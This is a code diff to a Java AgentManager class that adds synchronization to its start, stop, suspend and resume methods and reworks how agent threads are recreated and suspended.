@@ -52,7 +52,7 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 	 * 
 	 * @return true, if successful
 	 */
-	public boolean startAll() {
+	public synchronized boolean startAll() {
 		HashMap<AgentType, AgentConf> agents;
 		agents = status.getAgentsMap();
 
@@ -72,7 +72,7 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 			final AgentType key = it.next();
 			Check.asserts(key != null, "null type");
 			AgentConf conf = agents.get(key);
-			
+
 			if (conf.isEnabled()) {
 				start(key);
 			}
@@ -85,7 +85,7 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 	/**
 	 * Stop agents.
 	 */
-	public void stopAll() {
+	public synchronized void stopAll() {
 		HashMap<AgentType, AgentConf> agents;
 		agents = status.getAgentsMap();
 		final Iterator<AgentType> it = agents.keySet().iterator();
@@ -130,17 +130,12 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 		}
 
 		// Agent mapped and running
-		if (a.getStatus() == AgentConf.AGENT_RUNNING) {
-			Log.d("QZ", TAG + " Agent " + key + " is already running");
+		if (a.isRunning() || a.isSuspended()) {
+			Log.d("QZ", TAG + " Agent " + key + " is already running or suspended");
 			return;
 		}
 
-		// start() will NEVER be valid again on a stopped thread
-		// so unmap and restart the thread
-		if (a.getStatus() == AgentConf.AGENT_STOPPED) {
-			// running.remove(key);
-			a = makeAgent(key);
-		}
+		a = makeAgent(key);
 
 		Check.asserts(a != null, "null agent");
 		Check.asserts(running.get(key) != null, "null running");
@@ -213,11 +208,11 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 		suspend(a);
 	}
 
-	public void suspend(AgentBase agent) {
+	public synchronized void suspend(AgentBase agent) {
 		// suspending a thread implies a stop
 		if (agent.isRunning()) {
-			agent.suspend();
-
+			
+			agent.stopThread();
 			final Thread t = threads.get(agent);
 			if (t != null) {
 				try {
@@ -228,6 +223,7 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 				}
 			}
 			threads.remove(agent);
+			agent.suspend();
 		}
 
 	}
@@ -250,8 +246,8 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 
 	}
 
-	public void resume(AgentBase agent) {
-
+	public synchronized void resume(AgentBase agent) {
+		
 		if (agent.isSuspended()) {
 			// this clean the suspendend status
 			agent.resume();
